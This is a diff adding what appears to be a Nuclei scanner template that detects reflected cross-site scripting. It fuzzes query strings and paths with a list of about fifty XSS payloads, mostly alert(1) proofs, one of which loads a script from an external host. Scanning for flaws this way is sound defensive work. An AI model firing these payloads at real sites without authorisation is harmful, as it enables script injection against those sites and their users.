@@ -1,0 +1,94 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<details draggable=\"true\" ondragstart=\"alert(1)\">test</details>"
+        - "<IMG SRC=x ONERROR=\"javascript:alert('XSS')\">"
+        - "<script>alert(1)</script>"
+        - "<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input autofocus>"
+        - "<map id=x tabindex=1 ondeactivate=alert(1)></map><input id=y autofocus>"
+        - "<font oncut=\"alert(1)\" contenteditable>test</font>"
+        - "<time oncontextmenu=\"alert(1)\">test</time>"
+        - "<ul draggable=\"true\" contenteditable>drag me</ul><source ondrop=alert(1) contenteditable>drop here</source>"
+        - "<input type=\"image\" src=\"jav&#x09;ascript:alert(1)\">"
+        - "<font id=x tabindex=1 ondeactivate=alert(1)></font><input id=y autofocus>"
+        - "<style>@keyframes slidein {}</style><script style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></script>"
+        - "<del onbeforecut=\"alert(1)\" contenteditable>test</del>"
+        - "&lt;SCRIPT SRC=http://ha.ckers.org/jss.xss&gt;&lt;/SCRIPT&gt;"
+        - "<iframe srcdoc=\"&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;\" style=\"overflow:auto;width:expression(alert(1))\"></iframe>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img></div>"
+        - "<details draggable=\"true\" ondragend=\"alert(1)\">test</details>"
+        - "<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>"
+        - "<legend id=x tabindex=1 onactivate=alert(1)></legend>"
+        - "<script>alert(1)</script>"
+        - "<style>@keyframes x{}</style><optgroup style=\"animation-name:x\" onanimationstart=\"alert(1)\"></optgroup>"
+        - "<time draggable=\"true\" ondragend=\"alert(1)\">test</time>"
+        - "<script>alert(1)</script"
+        - "<xmp draggable=\"true\" ondragstart=\"alert(1)\">test</xmp>"
+        - "<iframe draggable=\"true\" ondragenter=\"alert(1)\">test</iframe>"
+        - "<SCRIPT>alert(1)</SCRIPT>"
+        - "<del draggable=\"true\" ondragend=\"alert(1)\">test</del>"
+        - "<marquee id=x tabindex=1 ondeactivate=alert(1)></marquee><input autofocus>"
+        - "<input draggable=\"true\" ondragstart=\"alert(1)\">test</input>"
+        - "<mark draggable=\"true\" ondragstart=\"alert(1)\">test</mark>"
+        - "<col onmousedown=\"alert(1)\">test</col>"
+        - "<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>"
+        - "<iframe draggable=\"true\" ondragleave=\"alert(1)\">test</iframe>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><optgroup id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></optgroup>"
+        - "<svg><template onload=alert(1)>"
+        - "<;script>;alert(';XSS';);<;/script>"
+        - "<p onmousemove=\"alert(1)\">test</p>"
+        - "&lt;img src=xxx:x onerror\\x2D=javascript:alert(1)>"
+        - "<svg/onload=javascript:alert(1)</svg>"
+        - "&lt;SCRIPT>alert(&#39;&#39;&#41;&gt;&#40;&quot;&#60;&#45;&#97;&#99;&#111;alert&#40;89&#41;&#59;&#40;&#38;85,&#83;&#83;&#83;&#83;)"
+        - "<IMG SRC=\"jav&#x09;cript:alert(1)\">"
+        - "<output id=x style=\"behavior:url('#default#time')\" type=image src=\"onerror=javascript:alert(1)\"></output>"
+        - "<marquee><blink draggable=\"true\" ondragleave=\"alert(1)\">test</blink></marquee>"
+        - "<script>alert('XSS')</script>"
+        - "<font draggable=\"true\" ondragleave=\"alert(1)\">test</font>"
+        - "<;STYLE>;body {-moz-binding-url:\"http://www.w3.org/2002/svg#stXSS#1\"}; <;/STYLE>;<;IMG SRC=\"</img>;\";>;"
+        - "<basefont draggable=\"true\" ondragend=\"alert(1)\">test</basefont>"
+        - "<style>@keyframes slidein {}</style><fieldset style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></fieldset>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
